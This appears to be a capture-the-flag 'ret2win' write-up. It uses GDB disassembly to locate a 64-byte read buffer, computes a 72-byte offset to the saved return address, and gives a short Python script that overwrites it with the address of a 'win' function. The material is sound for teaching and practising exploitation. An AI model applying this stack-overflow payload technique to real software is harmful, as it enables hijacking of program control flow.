# Ret2Win — GDB / Assembly

Input starts from:

```text
(RBP) - 0x40
```

```asm
mov    -0x8(%rbp),%rdx
lea    -0x40(%rbp),%rax
mov    %rax,%rsi
mov    $0x0,%edi
call   0x401120 <read@plt>
```

---

## Offset

```text
(RBP + 8) - (RBP - 0x40)

= 0x48

= 72 bytes
```

---

## Win

```asm
Dump of assembler code for function win:

0x0000000000401371 <+0>:     endbr64
0x0000000000401375 <+4>:     push   %rbp
0x0000000000401376 <+5>:     mov    %rsp,%rbp
```

Win is at:

```text
0x0000000000401371
```

---

## Exploit

```text
int / eax      → I → 4 bytes

pointer / RIP  → Q → 8 bytes
```

```python
import sys
import struct

payload = b"A" * 72
payload += struct.pack("<Q", 0x401371)

sys.stdout.buffer.write(payload)
```
